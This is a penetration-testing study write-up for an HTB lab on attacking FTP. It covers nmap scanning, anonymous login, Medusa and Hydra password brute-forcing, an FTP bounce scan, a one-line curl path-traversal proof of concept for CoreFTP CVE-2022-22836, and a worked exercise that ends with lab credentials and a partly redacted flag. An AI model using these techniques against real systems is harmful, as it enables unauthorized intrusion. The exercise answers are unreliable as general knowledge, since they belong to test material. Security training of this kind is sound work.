### CPTS / HTB Penetration Tester Path <br>
### Attacking Common Services - FTP Attacks & Vulnerabilities <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Attacking FTP



FTP defaults to `TCP/21`. `Nmap` `-sC` runs `ftp-anon` (checks anon login); `-sV` grabs the banner.

Nmap default scan:

```diff
+ $ sudo nmap -sC -sV -p 21 192.168.2.142
```

<br>

Anonymous login (try `anonymous` with no password):

```diff
+ $ ftp 192.168.2.142
```

<br>

Inside `ftp`: `ls`, `cd`, `get <file>`, `mget *`, `put <file>`, `mput *`, `help`.

Brute-force with `Medusa`:

```diff
+ $ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```

| Flag | Description |
|---|---|
| `-u` | single user |
| `-U` | userlist file |
| `-P` | password list file |
| `-M` | protocol (ftp) |
| `-h` | target host |

<br>

FTP Bounce Attack - abuse `PORT` command via FTP server to scan another internal host:

```diff
+ $ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

<br>

---

<br>

### Latest FTP Vulnerabilities - CoreFTP CVE-2022-22836



CoreFTP < build 727 mishandles HTTP `PUT` requests -> authenticated path traversal + arbitrary file write ([CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836)).

PoC ([Exploit-DB 50652](https://www.exploit-db.com/exploits/50652)):

```diff
+ $ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

| Flag | Description |
|---|---|
| `-X PUT` | raw HTTP PUT |
| `--basic -u user:pass` | basic auth |
| `--path-as-is` | preserve `..` traversal |
| `--data-binary` | file contents |
| `-H "Host: <IP>"` | target host header |

#### Concept mapping - directory traversal:

| # | Step | Category |
|---|---|---|
| 1 | User specifies HTTP request type + content + escape chars to break out of jail. | `Source` |
| 2 | App processes the changed request type, contents, and path. | `Process` |
| 3 | Path check is bypassed - restriction only applies to one folder, traversal escapes it. | `Privileges` |
| 4 | Local writer process is the destination. | `Destination` |

#### Concept mapping - arbitrary file write (cycle restart):

| # | Step | Category |
|---|---|---|
| 5 | Same user input reused - filename `whoops` and contents `PoC.`. | `Source` |
| 6 | Process writes specified content to specified file. | `Process` |
| 7 | Restrictions already bypassed -> service allows the write. | `Privileges` |
| 8 | File `whoops` with contents `PoC.` lands on the local system. | `Destination` |

<br>

---

<br>

### FTP Exercise

IP: 10.129.203.6

---

### Question 1:
What port is the FTP service running on?

#### Wide TCP scan to find FTP on a non-default port.

```diff
+ $ sudo nmap -sT -sV -sC -Pn -p 1-9999 10.129.203.6 -v
```

	PORT     STATE SERVICE VERSION
	2121/tcp open  ftp
	|   220 ProFTPD Server (InlaneFTP) [10.129.203.6]

&#x1F6A9; found **2121**.

---

### Question 2:
What username is available for the FTP server?

#### SMB on 445 was open too - `rpcclient` null session enumerated domain users faster than brute-forcing FTP.

```diff
+ $ rpcclient -U "" 10.129.203.6
+ rpcclient $> enumdomusers
```

	user:[jason] rid:[0x3e8]
	user:[robin] rid:[0x3e9]

&#x1F6A9; found **ro--edit--in**.

---

### Question 3:
Using the credentials obtained earlier, retrieve the flag.txt file. Submit the contents as your answer.

#### Anonymous FTP was enabled; pulled wordlists left on the server.

```diff
+ $ ftp 10.129.203.6 -p 2121
+ ftp> mget *
```

	-rw-r--r--   1 ftp      ftp          1959 Apr 19  2022 passwords.list
	-rw-rw-r--   1 ftp      ftp            72 Apr 19  2022 users.list

#### Hydra against robin with the captured passwords.list:

```diff
+ $ hydra -l robin -P passwords.list ftp://10.129.203.6:2121 -vV
```

	[2121][ftp] host: 10.129.203.6   login: robin   password: 7iz4rnckjsduza7

#### Auth as robin and grab `flag.txt`:

```diff
+ $ ftp 10.129.203.6 -p 2121
+ ftp> get flag.txt
```

&#x1F6A9; found **HTB{ATT4CK1NG_F--edit--7P_53RV1C3}**.
